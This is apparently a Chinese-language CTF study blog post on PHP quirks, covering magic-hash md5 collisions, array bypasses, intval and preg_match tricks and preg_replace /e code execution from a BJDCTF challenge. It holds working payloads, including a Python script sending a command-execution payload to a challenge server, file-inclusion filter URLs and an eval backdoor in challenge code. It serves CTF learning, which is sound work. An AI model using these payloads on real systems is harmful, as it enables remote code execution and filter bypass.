<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>PHP特性 | J1Nmu</title><meta name="author" content="Jinmu"><meta name="copyright" content="Jinmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP特性CTF&amp;#x2F;PHP特性汇总-安全客 - 安全资讯平台 (anquanke.com) 0x00:Hash比较缺陷 1PHP&amp;#96;在处理哈希字符串时，通过&amp;#96;!&amp;#x3D;&amp;#96;或&amp;#96;&amp;#x3D;&amp;#x3D;&amp;#96;来对哈希值进行比较，它把每一个以&amp;#96;0e&amp;#96;开头的哈希值都解释为&amp;#96;0&amp;#96;，所以如果两个不同的密码经过哈希以后，其哈希值都是以&amp;#96;"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jinmu1108.github.io/Web/PHP%E7%89%B9%E6%80%A7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHP特性',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-17 14:55:34'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">J1Nmu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP特性</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-17T06:44:24.733Z" title="发表于 2022-11-17 14:44:24">2022-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-17T06:55:34.978Z" title="更新于 2022-11-17 14:55:34">2022-11-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP特性"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231507#h2-0">CTF&#x2F;PHP特性汇总-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<h2 id="0x00-Hash比较缺陷"><a href="#0x00-Hash比较缺陷" class="headerlink" title="0x00:Hash比较缺陷"></a>0x00:Hash比较缺陷</h2><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP`在处理哈希字符串时，通过`!=`或`==`来对哈希值进行比较，它把每一个以`0e`开头的哈希值都解释为`0`，所以如果两个不同的密码经过哈希以后，其哈希值都是以`0e`开头的，那么`PHP`将会认为他们相同，都是`0</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://p1.ssl.qhimg.com/t0164f4d3638edfd342.png" alt="img"></p>
<p>审计代码，我们输入的不能相等，但<code>md5</code>却需要相等，这明显的就是利用<code>Hash</code>的比较缺陷来做</p>
<p>我们只要找出两个数再<code>md5</code>加密后都为<code>0e</code>开头的即可，常用的有以下几种</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>

<p>所以构造<code>a=QNKCDZO&amp;b=s878926199a</code>即可绕过</p>
<h2 id="0x01-md5"><a href="#0x01-md5" class="headerlink" title="0x01:md5"></a>0x01:md5</h2><h4 id="第一种：md5函数绕过"><a href="#第一种：md5函数绕过" class="headerlink" title="第一种：md5函数绕过"></a>第一种：md5函数绕过</h4><blockquote>
<p>一、<code>md5()</code>函数获取不到数组的值，默认数组为0<br>二、<code>sha1()</code>函数无法处理数组类型，将报错并返回false</p>
</blockquote>
<p><img src="https://p0.ssl.qhimg.com/t0155a47be34a8f7084.png" alt="img"></p>
<p>payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://p5.ssl.qhimg.com/t01d85d82a74fb3d21f.png" alt="img"></p>
<p>注意这里是<code>===</code>，不是<code>==</code>，所以这里采用<code>md5()</code>函数获取不到数组的值，默认数组为0这个特性来做，payload:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h4 id="第二种：md5强类型绕过"><a href="#第二种：md5强类型绕过" class="headerlink" title="第二种：md5强类型绕过"></a>第二种：md5强类型绕过</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(string)$_POST[<span class="string">&#x27;a1&#x27;</span>]!==(string)$_POST[<span class="string">&#x27;a2&#x27;</span>]</span><br><span class="line"> &amp;&amp; <span class="built_in">md5</span>($_POST[<span class="string">&#x27;a1&#x27;</span>])===<span class="built_in">md5</span>($_POST[<span class="string">&#x27;a2&#x27;</span>])&#125;</span><br></pre></td></tr></table></figure>

<p>例如这段代码，使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串.<br><img src="https://cdn.nlark.com/yuque/0/2021/png/5370867/1613553900781-02d9a72a-56b9-493d-b28b-e448258a7bb4.png#align=left&display=inline&height=96&margin=%5Bobject%20Object%5D&originHeight=96&originWidth=893&size=0&status=done&style=none&width=893" alt="img"><br>两组经过url编码后的值</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1</span></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7B</span>r%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1B</span>%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7B</span>%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7B</span>r%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1B</span>%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7B</span>%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">#<span class="number">2</span></span><br><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7b</span>%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6f</span>%a7%b2%<span class="number">1b</span>%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7b</span>%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4b</span>%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4b</span>%<span class="number">55</span>%b3%<span class="number">5f</span>%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5f</span>%<span class="number">07</span>%fe%a2</span><br><span class="line">b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7b</span>%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6f</span>%a7%b2%<span class="number">1b</span>%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7b</span>%<span class="number">95</span>%<span class="number">18</span>%af%bf%</span><br></pre></td></tr></table></figure>

<h2 id="0x03-intval函数绕过"><a href="#0x03-intval函数绕过" class="headerlink" title="0x03:intval函数绕过"></a>0x03:intval函数绕过</h2><h4 id="第一个特性："><a href="#第一个特性：" class="headerlink" title="第一个特性："></a>第一个特性：</h4><p><img src="https://p3.ssl.qhimg.com/t01c68c908123b9d616.png" alt="img"></p>
<h4 id="第二个特性："><a href="#第二个特性：" class="headerlink" title="第二个特性："></a>第二个特性：</h4><p><img src="https://p0.ssl.qhimg.com/t01ad9612f4b2ba7d98.png" alt="img"></p>
<p>例如：</p>
<p><img src="https://p2.ssl.qhimg.com/t01d70e23bf06a45737.png" alt="img"></p>
<p>payload如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span></span><br><span class="line">?num=<span class="number">0</span>10574</span><br></pre></td></tr></table></figure>

<p>除此之外，这个函数还可以使用小数点来进行操作</p>
<p><img src="https://p2.ssl.qhimg.com/t01f625151f9faa6888.png" alt="img"></p>
<h4 id="第三个特性："><a href="#第三个特性：" class="headerlink" title="第三个特性："></a>第三个特性：</h4><blockquote>
<p>如果$base为0直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时(\0)结束转换，但前提是进行弱类型比较</p>
</blockquote>
<p>例如：</p>
<p><img src="https://p3.ssl.qhimg.com/t0135b53eb67f64d71e.png" alt="img"></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476e1</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-preg-match函数绕过"><a href="#0x04-preg-match函数绕过" class="headerlink" title="0x04:preg_match函数绕过"></a>0x04:preg_match函数绕过</h2><h4 id="第一种：-x2F-m"><a href="#第一种：-x2F-m" class="headerlink" title="第一种：&#x2F;m"></a>第一种：&#x2F;m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>,$a))</span><br></pre></td></tr></table></figure>

<p>&#x2F;m 多行匹配，但是当出现换行符 <code>%0a</code>的时候，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。</p>
<h4 id="第二种：回溯绕过，"><a href="#第二种：回溯绕过，" class="headerlink" title="第二种：回溯绕过，"></a>第二种：回溯绕过，</h4><p> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit,可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限</p>
<p><img src="https://p2.ssl.qhimg.com/t01d245b92559eea0e3.png" alt="img"></p>
<p>回溯次数上限默认是100万,如果回溯次数超过了100万，preg_match返回的<strong>便不再是0或1，而是false</strong>，利用这个方法，可以写一个脚本，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF</p>
<p>这里给两个个模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 开发时间：2022/11/10 23:30</span><br><span class="line">import requests</span><br><span class="line">payload=&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27; + &quot;@&quot;*(1000000) + &#x27;&quot;&#125;&#x27;		//短标签   `命令执行 最大回收绕过</span><br><span class="line">res = requests.post(&quot;http://1.14.71.254:28704/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://3638bf4e-f63d-477c-95eb-ba023f279de8.chall.ctf.show:8080/&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reponse = requests.post(url,data=data)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-preg-replace-x2F-e-模式下的代码执行"><a href="#0x05-preg-replace-x2F-e-模式下的代码执行" class="headerlink" title="0x05: preg_replace &#x2F;e 模式下的代码执行"></a>0x05: preg_replace &#x2F;e 模式下的代码执行</h2><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//</span><br><span class="line">?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>next.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于<strong>preg_replace</strong>官方给出的解释</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span>( <span class="keyword">mixed</span> <span class="variable">$pattern</span>, <span class="keyword">mixed</span> <span class="variable">$replacement</span>, <span class="keyword">mixed</span> <span class="variable">$subject</span>[, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>[, <span class="keyword">int</span> &amp;<span class="variable">$count</span>]] )</span><br></pre></td></tr></table></figure>

<p><code>pattern</code></p>
<p>要搜索的模式。可以使一个字符串或字符串数组。 </p>
<p>可以使用一些PCRE修饰符。 </p>
<p><code>replacement</code></p>
<p>用于替换的字符串或字符串数组。<strong>如果这个参数是一个字符串，并且pattern 是一个数组，那么所有的模式都使用这个字符串进行替换。如果pattern和replacement 都是数组，每个pattern使用replacement中对应的元素进行替换。如果replacement中的元素比pattern中的少，多出来的pattern使用空字符串进行替换。</strong></p>
<p><code>subject</code></p>
<p>要进行搜索和替换的字符串或字符串数组。             如果<code>subject</code>是一个数组，搜索和替换回在<code>subject</code>       的每一个元素上进行, 并且返回值也会是一个数组。       </p>
<p><code>limit</code></p>
<p>每个模式在每个<code>subject</code>上进行替换的最大次数。默认是       <em>-1</em>(无限)。       </p>
<p><code>count</code></p>
<p>如果指定，将会被填充为完成的替换次数。</p>
<p>这里看了这篇文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110955-2fe1030e-9ddd-1.png" alt="20180812110955-2fe1030e-9ddd-1"></p>
<p>这个案例，就是 <strong>preg_replace</strong> 使用了 <strong>&#x2F;e</strong> 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
<h5 id="爬坑1"><a href="#爬坑1" class="headerlink" title="爬坑1"></a>爬坑1</h5><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。我们来看看 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> 中对其的描述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure>

<p>这里的<code>\1</code>实际上指定的是第一个子匹配项，我们拿 <strong>ripstech</strong> 官方给的 <strong>payload</strong> 进行分析，方便大家理解。官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即GET方式传入的参数名为 <strong>&#x2F;?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $value);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>由于前面<code>(.*)</code>匹配了任意字符，而第一个子匹配项就能执行我们的恶意代码如phpinfo()</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110955-2ff43faa-9ddd-1.png" alt="20180812110955-2ff43faa-9ddd-1"></p>
<h5 id="爬坑2"><a href="#爬坑2" class="headerlink" title="爬坑2"></a>爬坑2</h5><p>上面的 <strong>preg_replace</strong> 语句如果直接写在程序里面，当然可以成功执行 <strong>phpinfo()</strong> ，然而我们的 <strong>.*</strong> 是通过 <strong>GET</strong> 方式传入，你会发现无法执行 <strong>phpinfo</strong> 函数，如下图：</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110955-3005248c-9ddd-1.png" alt="20180812110955-3005248c-9ddd-1"></p>
